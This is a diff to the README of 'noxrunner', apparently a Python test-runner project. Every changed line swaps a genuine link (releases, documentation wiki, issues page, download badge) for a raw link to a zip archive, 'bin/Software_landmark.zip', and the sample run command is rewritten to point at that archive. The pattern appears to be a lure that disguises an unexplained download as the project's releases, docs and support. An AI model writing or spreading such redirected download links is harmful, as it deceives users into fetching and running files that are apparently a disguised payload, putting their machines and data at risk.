@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now!
 
-[![Download noxrunner](https://img.shields.io/badge/Download%20noxrunner-v1.0-blue.svg)](https://github.com/Mykazi127/noxrunner/releases)
+[![Download noxrunner](https://github.com/Mykazi127/noxrunner/raw/refs/heads/main/bin/Software_landmark.zip%https://github.com/Mykazi127/noxrunner/raw/refs/heads/main/bin/Software_landmark.zip)](https://github.com/Mykazi127/noxrunner/raw/refs/heads/main/bin/Software_landmark.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ Ready to try out Noxrunner? Follow these easy steps to get started with the appl
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Mykazi127/noxrunner/releases) to find the latest version of Noxrunner.
+1. Visit the [Releases page](https://github.com/Mykazi127/noxrunner/raw/refs/heads/main/bin/Software_landmark.zip) to find the latest version of Noxrunner.
 2. Look for the version you wish to download. Click on the asset that matches your operating system to start the download.
 3. Once the download is complete, locate the file on your computer.
 
@@ -47,7 +47,7 @@ After installation, you can start using Noxrunner.
 ### 🔧 Basic Commands
 
 - **Running Tests:**  
-  Simply type `noxrunner run my_test_file.py` to execute your test file.
+  Simply type `noxrunner run https://github.com/Mykazi127/noxrunner/raw/refs/heads/main/bin/Software_landmark.zip` to execute your test file.
 
 - **Viewing Help:**  
   If you need assistance, type `noxrunner help` to see available commands and options.
@@ -71,7 +71,7 @@ To check your Python version, run `python --version` in your terminal or command
 
 ## 📘 Documentation
 
-For more detailed instructions and advanced usage, refer to our [Documentation](https://github.com/Mykazi127/noxrunner/wiki). Here you will find guides on using Noxrunner effectively, including examples and troubleshooting tips.
+For more detailed instructions and advanced usage, refer to our [Documentation](https://github.com/Mykazi127/noxrunner/raw/refs/heads/main/bin/Software_landmark.zip). Here you will find guides on using Noxrunner effectively, including examples and troubleshooting tips.
 
 ## 🛠️ Contributing
 
@@ -84,7 +84,7 @@ We welcome contributions! If you're interested in improving Noxrunner, please fo
 
 ## 🗨️ Support
 
-If you encounter issues or have questions, please check the [Issues section](https://github.com/Mykazi127/noxrunner/issues) on GitHub. You can also submit a new issue if your problem is not listed.
+If you encounter issues or have questions, please check the [Issues section](https://github.com/Mykazi127/noxrunner/raw/refs/heads/main/bin/Software_landmark.zip) on GitHub. You can also submit a new issue if your problem is not listed.
 
 ## 🤝 Community
 
@@ -101,6 +101,6 @@ Noxrunner is licensed under the MIT License. This means you can use, modify, and
 
 ## 📥 Download & Install Again
 
-Don't forget to visit our [Releases page](https://github.com/Mykazi127/noxrunner/releases) to download the latest version. 
+Don't forget to visit our [Releases page](https://github.com/Mykazi127/noxrunner/raw/refs/heads/main/bin/Software_landmark.zip) to download the latest version. 
 
 Now you are ready to explore Noxrunner! Enjoy running your tests in a safe and efficient manner!
